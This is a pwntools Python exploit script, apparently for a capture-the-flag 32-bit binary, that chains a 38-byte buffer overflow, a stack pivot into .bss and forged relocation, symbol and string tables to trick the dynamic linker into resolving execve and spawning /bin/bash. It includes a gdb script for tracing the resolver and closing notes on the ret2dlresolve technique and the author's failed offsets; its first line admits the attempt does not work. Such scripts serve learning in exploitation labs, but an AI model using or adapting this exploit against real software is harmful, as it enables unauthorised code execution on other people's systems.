
# WON"T WORK, STRTAB is stored in X page of binary
from pwn import *

binary_name = "./tmp/binary1"
libc = ELF("./libc.so.6")

inputs = [b'ex4722', b'What do you mean? African or European swallow?\x00', b'ex4722']
exe = ELF(binary_name)
rop = ROP(binary_name)

gdbscript = r"""
define ld_load
    x/2x $esp
    set $stack = $esp + 4
    set $i =  *((char **) ($stack))
    printf "AT %p is %d\n", $stack, $i
    x/2wx 0x08048320 + $i 
    printf "R_info: %p\n", *( 0x08048320 + $i +4)
    set $rinfo = *(int)( 0x08048320 + $i +4)
    set $rsym = $rinfo >> 8 
    printf "R_sym: %p\n", $rsym 
    set $sym = 0x080481cc + 0x10 * $rsym
    printf "SYM : %p\n", $sym 
    x/6wx $sym
    printf "STR_OFF: %p\n", *$sym 
    set $sym =  *$sym 
    printf "Symbol: %s\n", $sym + 0x0804826c
end
c
"""


def new_processes():
    p = process(binary_name)
    for i in inputs:
        p.send(i)
    return p

def new_debug():
    p = gdb.debug(binary_name,gdbscript=gdbscript)
    for i in inputs:
        p.send(i)
    return p

bof_size = 38


p = new_processes()

dl_resolve_func = 0x8048380
leave_ret = 0x08048cab
leave_ret = rop.find_gadget(["leave","ret"]).address 
stack_gad = rop.find_gadget(["pop ebx","pop esi", "pop edi", "pop ebp"]).address
ret = rop.find_gadget(["ret"]).address


p = new_debug()
# Stack Piviot, read into fake stack, then jmp
fake_stack = exe.bss() + 0x900
# table_padding = 12 + 0x10*3
table_padding = 12 
fake_table = exe.bss() + 0x200 + table_padding + 0x30


payload = flat([ 
    b"A"*(bof_size),
    exe.plt.read,
    stack_gad,
    0, fake_stack, 0x400,
    # New EBP 
    fake_stack,
    # New RIP,pivot now
    leave_ret,
    ])

p.send(payload)
sleep(.5)


jmprel = 0x08048320
symtab  = 0x080481cc
strtab  = 0x0804826c


fake_jmp = p32(0)  + p32(0)
fake_sym = p32(0) + p32(0)*3

jmp_offset = fake_table- jmprel


sym_offset = (fake_table +len(fake_jmp) - symtab) // 0x10
assert sym_offset == (fake_table +len(fake_jmp) - symtab) / 0x10


str_offset = fake_table + len(fake_jmp) + len(fake_sym) - strtab

r_info =  (sym_offset << 8)  | 7 

fake_jmp = p32(exe.got.memset)  + p32(r_info)
fake_sym = p32(str_offset) + p32(0) + p32(0) +p32(0) #p32(0x0300)
fake_str = b"execve\x00\x00/bin/bash"

fake = fake_jmp + fake_sym + fake_str

# Read in fake tables 
payload = flat([ 
    0xcafebabe,
    exe.plt.read,
    stack_gad,
    0, fake_table, 0x400,

    # New EBP, to instruction after lev_ret
    fake_stack + (7*4),
    # New RIP,pivot again to next instructin
    leave_ret,
    dl_resolve_func,
    jmp_offset,
    # execve ret addr
    0xdeadbeef,
    fake_table + fake.index(b"/bin/bash"),
    0,0
    ])
p.send(payload)

# Send fake table
sleep(.5)
input("BREAK")
p.send(fake)




"""
How to ret 2 dl_resolve:
push val1
dl_runtime_resolve()
val1 + jumprel -(ONE ENTRY???) == Elf32_Rel  *reloc_table
    *reloc_table  = got addr
    *reloc_table +4 = r_info 
        ELF32_R_SYM == r_info >>8 
        ELF32_R_TYPE == r_info & 0xff ( 7 for GOT??)

func's symtab == symtab + ELF32_R_SYM * 0x10

name = STRTAB + func's symtab(First entry)


elf_machine_fixup_plt()
Writes result to got addr specificed


jmp_offset correct 
symtab_offset
strOffset WRONG

Messup upp ofset??
Strtab + 0 for some reason
adds it here _dl_fixup+228

Checking offset 
    _dl_fixup+120
"""
